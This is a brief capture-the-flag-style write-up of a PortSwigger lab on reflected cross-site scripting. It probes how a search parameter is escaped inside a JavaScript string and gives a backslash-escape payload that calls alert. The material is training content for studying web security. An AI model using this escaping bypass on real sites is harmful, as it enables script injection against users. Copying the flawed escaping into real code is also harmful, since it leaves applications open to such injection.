# [Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)

## Lab

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

## Analysis

request:

  ```http
  GET /?search='"/\<> HTTP/1.1
  ```

- response:

  ```js
  <script>
      var searchTerms = '\'&quot;/\&lt;&gt;';
      document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
  </script>
  ```

  - `'`: escaped (1)
  - `"<>`: html encoded
  - `/\`: nothing (2)

(1) + (2) => ez to bypass

## Solutions

request:

```http
GET /?search=\';alert(1);// HTTP/1.1
```

response: boom, lab solved
